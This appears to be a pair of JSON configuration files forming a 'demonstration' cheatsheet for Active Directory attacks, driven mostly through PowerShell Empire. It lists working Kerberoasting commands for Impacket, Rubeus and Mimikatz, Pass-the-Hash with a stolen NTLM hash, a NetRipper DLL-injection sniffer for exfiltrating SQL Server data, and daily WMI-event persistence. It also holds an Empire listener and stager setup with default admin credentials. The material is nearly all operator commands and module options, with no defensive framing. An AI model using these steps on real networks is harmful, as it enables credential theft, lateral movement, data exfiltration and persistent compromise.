
{
  "description": "Demonstration Cheatsheet for Advanced Exploitation Scenarios",
  "scenarios": {
    "Kerberoasting": {
      "tool": "Impacket or Rubeus",
      "description": "Extract and crack Kerberos tickets for service accounts to uncover weak passwords.",
      "commands": {
        "Impacket": "GetUserSPNs.py <domain>/<username>:<password> -request",
        "Rubeus": "Rubeus.exe kerberoast",
        "Mimikatz": "kerberos::list /export"
      }
    },
    "Pass-the-Hash": {
      "description": "Demonstrate lateral movement using Pass-the-Hash technique.",
      "tool": "PowerShell Empire",
      "module": "credentials/pth",
      "options": {
        "User": "username_here",
        "NTLM": "ntlm_hash_here",
        "Target": "target_machine_name"
      }
    },
    "Data Exfiltration": {
      "description": "Show how to extract sensitive data from a compromised machine.",
      "tool": "PowerShell Empire",
      "module": "collection/netripper",
      "options": {
        "Application": "sqlserver.exe",
        "PathToSave": "/path/to/save/data"
      }
    },
    "Advanced Persistence": {
      "description": "Establish advanced persistence using WMI events.",
      "tool": "PowerShell Empire",
      "module": "persistence/elevated/wmi",
      "options": {
        "Listener": "listener_name_here",
        "DailyTime": "HH:mm"
      }
    }
  }
}





{
  "api/admin/login": {
    "username": "empireadmin",
    "password": "password"
  },
  "listeners/http": {
    "Name": "http_listener_demo",
    "Port": 8080,
    "Host": "http://localhost:8080"
  },
  "stagers": {
    "Listener": "http_listener_demo",
    "StagerName": "windows/launcher_bat",
    "OutFile": "C:\\Path\\To\\launcher_demo.bat"
  },
  "kerberoast": {
    "ModuleName": "credentials/kerberoast",
    "Agent": "agent_name_here",
    "Options": {
      "SPN": "MSSQLSvc/domain.com:1433",
      "User": "optional_user_name"
    },
    "Description": "Ce module lance une attaque Kerberoast pour extraire les tickets TGS des comptes de service. Les tickets peuvent ensuite être crackés hors ligne pour récupérer des mots de passe. La spécification d'un SPN (Service Principal Name) cible peut affiner l'attaque vers des services spécifiques."
  },
  "pass-the-hash": {
    "ModuleName": "credentials/pth",
    "Agent": "agent_name_here",
    "Options": {
      "User": "username_here",
      "NTLM": "ntlm_hash_here",
      "Target": "target_machine_name"
    },
    "Description": "Utilise la technique Pass-the-Hash pour s'authentifier sur une machine cible sans mot de passe en texte clair, en utilisant un hash NTLM récupéré."
  },
  "data-exfiltration": {
    "ModuleName": "collection/netripper",
    "Agent": "agent_name_here",
    "Options": {
      "Application": "sqlserver.exe",
      "PathToSave": "/path/to/save/data"
    },
    "Description": "Injecte un sniffer DLL dans des processus spécifiques (par exemple, sqlserver.exe) pour intercepter et exfiltrer des données sensibles."
  },
  "persistence": {
    "ModuleName": "persistence/elevated/wmi",
    "Agent": "agent_name_here",
    "Options": {
      "Listener": "listener_name_here",
      "DailyTime": "HH:mm"
    },
    "Description": "Configure une persistance en utilisant les événements WMI pour exécuter un payload à un moment spécifié chaque jour."
  }
}
